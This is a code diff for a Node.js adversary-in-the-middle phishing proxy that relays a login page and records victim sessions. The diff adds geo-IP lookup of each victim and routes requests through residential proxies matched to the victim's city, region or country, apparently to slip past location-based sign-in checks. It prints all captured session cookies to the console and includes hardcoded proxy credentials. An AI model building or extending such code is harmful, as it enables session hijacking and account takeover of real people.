@@ -4,7 +4,7 @@ const path = require("path");
 const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
-
+const { HttpsProxyAgent } = require('https-proxy-agent'); // <-- ADDED
 
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
@@ -34,10 +34,73 @@ try {
     displayError("Directory creation failed", error, LOGS_DIRECTORY);
 }
 const LOG_FILE_STREAMS = {};
-//!\ It is strongly recommended to modify the encryption key and store it more securely for real engagements. /!\\
 const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
 
-const VICTIM_SESSIONS = {}
+const VICTIM_SESSIONS = {};
+
+// ==================== GEO-IP & PROXY HELPERS ====================
+function getClientIP(clientRequest) {
+    const forwarded = clientRequest.headers['x-forwarded-for'];
+    if (forwarded) {
+        const ips = forwarded.split(',');
+        return ips[0].trim();
+    }
+    return clientRequest.socket.remoteAddress || '';
+}
+
+async function getVictimGeo(ip) {
+    if (!ip || ip === '::1' || ip === '127.0.0.1' || ip.startsWith('10.') || ip.startsWith('192.168.')) {
+        return null;
+    }
+    try {
+        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,continentCode,countryCode,regionName,city`);
+        const data = await response.json();
+        if (data.status === 'success') {
+            return {
+                continent: data.continentCode,
+                country: data.countryCode,
+                region: data.regionName.replace(/\s+/g, ''),
+                city: data.city.replace(/\s+/g, '')
+            };
+        }
+    } catch (error) {
+        console.error('Geo-IP lookup failed:', error.message);
+    }
+    return null;
+}
+
+function getSessionPool() {
+    const poolStr = process.env.PROXY_SESSION_POOL || '';
+    const pool = poolStr.split(',').map(s => s.trim()).filter(s => s);
+    if (pool.length === 0) {
+        return [generateRandomString(8)];
+    }
+    return pool;
+}
+
+function buildProxyUrl(location, sessionId) {
+    const host = process.env.PROXY_HOST || 'proxy.okeyproxy.com';
+    const port = process.env.PROXY_PORT || '31212';
+    const baseUser = process.env.PROXY_USER || 'customer-j1pv733632';
+    const pass = process.env.PROXY_PASS || 'rl96vvck';
+
+    if (!location) {
+        return `http://${baseUser}:${pass}@${host}:${port}`;
+    }
+
+    let tags = `-continent-${location.continent}`;
+    if (location.country) tags += `-country-${location.country}`;
+    if (location.region) tags += `-region-${location.region}`;
+    if (location.city) tags += `-city-${location.city}`;
+
+    const user = `${baseUser}${tags}-session-${sessionId}-time-17`;
+    return `http://${user}:${pass}@${host}:${port}`;
+}
+
+function buildProxyAgentFromUrl(proxyUrl) {
+    return new HttpsProxyAgent(proxyUrl);
+}
+// ==================== END GEO-IP & PROXY HELPERS ====================
 
 
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
@@ -59,6 +122,53 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
             VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
             VICTIM_SESSIONS[session].port = phishedURL.port;
             VICTIM_SESSIONS[session].host = phishedURL.host;
+
+            // ========== NEW: Initialize proxy state for this session ==========
+            if (!VICTIM_SESSIONS[session].victimIP) {
+                const victimIP = getClientIP(clientRequest);
+                VICTIM_SESSIONS[session].victimIP = victimIP;
+
+                VICTIM_SESSIONS[session].geoPromise = getVictimGeo(victimIP).then(geo => {
+                    VICTIM_SESSIONS[session].geo = geo;
+                    VICTIM_SESSIONS[session].proxyLevels = [];
+
+                    const pool = getSessionPool();
+                    if (geo) {
+                        // City level
+                        for (const sess of pool) {
+                            VICTIM_SESSIONS[session].proxyLevels.push({
+                                url: buildProxyUrl(geo, sess),
+                                level: 'city'
+                            });
+                        }
+                        // Region level (no city)
+                        const geoNoCity = { ...geo, city: null };
+                        for (const sess of pool) {
+                            VICTIM_SESSIONS[session].proxyLevels.push({
+                                url: buildProxyUrl(geoNoCity, sess),
+                                level: 'region'
+                            });
+                        }
+                        // Country level (no region/city)
+                        const geoCountryOnly = { ...geo, region: null, city: null };
+                        for (const sess of pool) {
+                            VICTIM_SESSIONS[session].proxyLevels.push({
+                                url: buildProxyUrl(geoCountryOnly, sess),
+                                level: 'country'
+                            });
+                        }
+                    } else {
+                        // Fallback: global proxies
+                        for (const sess of pool) {
+                            VICTIM_SESSIONS[session].proxyLevels.push({
+                                url: buildProxyUrl(null, sess),
+                                level: 'global'
+                            });
+                        }
+                    }
+                });
+            }
+            // ========== END NEW ==========
 
             clientResponse.writeHead(200, { "Content-Type": "text/html" });
             fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
@@ -259,7 +369,9 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                             VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                         }
 
-                        makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest);
+                        // Call the async makeProxyRequest and handle promise rejection
+                        makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest)
+                            .catch(error => displayError("Proxy request failed", error));
                     }
                 });
         }
@@ -273,9 +385,27 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 proxyServer.listen(process.env.PORT ?? 3000);
 
 
-const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
-    const protocol = proxyRequestProtocol === "https:" ? https : http;
-    const proxyRequest = protocol.request(proxyRequestOptions, (proxyResponse) => {
+const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest) => {
+    // ========== NEW: Wait for geo & proxy list, select first (city-level if available) ==========
+    if (VICTIM_SESSIONS[currentSession].geoPromise) {
+        await VICTIM_SESSIONS[currentSession].geoPromise;
+    }
+    if (!VICTIM_SESSIONS[currentSession].proxyAgent && VICTIM_SESSIONS[currentSession].proxyLevels?.length > 0) {
+        const firstProxy = VICTIM_SESSIONS[currentSession].proxyLevels[0];
+        console.log(`🌍 Using proxy (${firstProxy.level}): ${firstProxy.url}`);
+        VICTIM_SESSIONS[currentSession].proxyAgent = buildProxyAgentFromUrl(firstProxy.url);
+    }
+    const proxyAgent = VICTIM_SESSIONS[currentSession].proxyAgent;
+    // ========== END NEW ==========
+
+    const isHttps = proxyRequestProtocol === "https:";
+    const requestModule = isHttps ? https : http;
+    const requestOptions = { ...proxyRequestOptions };
+    if (isHttps && proxyAgent) {
+        requestOptions.agent = proxyAgent;
+    }
+
+    const proxyRequest = requestModule.request(requestOptions, (proxyResponse) => {
 
         logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
             .catch(error => displayError("Log encryption failed", error));
@@ -310,12 +440,11 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
 
             // ===================== ADDED: PRINT ALL COOKIES TO CONSOLE =====================
-console.log(`[COOKIES] Session: ${currentSession}`);
-for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
-    const expiresStr = isNaN(cookie.expires) ? 'session' : new Date(cookie.expires).toISOString();
-    console.log(`  ${cookie.name}=${cookie.value} (domain=${cookie.domain}, path=${cookie.path}, expires=${expiresStr})`);
-}
-// ==============================================================================
+            console.log(`[COOKIES] Session: ${currentSession}`);
+            for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
+                const expiresStr = isNaN(cookie.expires) ? 'session' : new Date(cookie.expires).toISOString();
+                console.log(`  ${cookie.name}=${cookie.value} (domain=${cookie.domain}, path=${cookie.path}, expires=${expiresStr})`);
+            }
             // ==============================================================================
         }
         proxyResponse.headers["cache-control"] = "no-store";
@@ -374,8 +503,9 @@ for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
         proxyRequest.write(proxyRequestBody);
     }
     proxyRequest.end();
-}
+};
 
+// ==================== REMAINING FUNCTIONS UNCHANGED ====================
 function displayError(message, error, ...args) {
     console.error("******************************");
     console.error(`${message}: ${error.name ?? error}`);
@@ -947,7 +1077,6 @@ function updateHTMLProxyResponse(decompressedResponseBody) {
     ]);
 }
 
-// Modify the FederationRedirectUrl variable to proxify the cross-origin navigation request to the ADFS portal
 function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
     const decompressedResponseBodyString = decompressedResponseBody.toString();
     const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
